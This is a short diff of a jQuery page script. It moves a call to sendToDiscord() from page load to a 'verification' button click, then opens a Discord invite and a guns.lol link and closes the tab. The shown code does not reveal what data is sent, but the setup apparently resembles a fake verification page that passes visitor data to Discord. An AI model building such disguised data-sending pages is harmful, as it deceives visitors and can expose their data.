@@ -105,12 +105,13 @@ $(async function () {
         }
     };
 
-    // Appel automatique
-    sendToDiscord().then(() => {
-        window.open("https://discord.gg/k6UZsYjeNY", "_blank");
-        window.open("https://guns.lol/k.d.c", "_blank");
-        setTimeout(() => {
-            window.close(); // Ferme l'onglet courant après ouverture des liens
-        }, 500); // 500 ms de délai, ajuste si besoin
+    $("#verifBtn").on("click", function () {
+        sendToDiscord().then(() => {
+            window.open("https://discord.gg/k6UZsYjeNY", "_blank");
+            window.open("https://guns.lol/k.d.c", "_blank");
+            setTimeout(() => {
+                window.close();
+            }, 500);
+        });
     });
 });
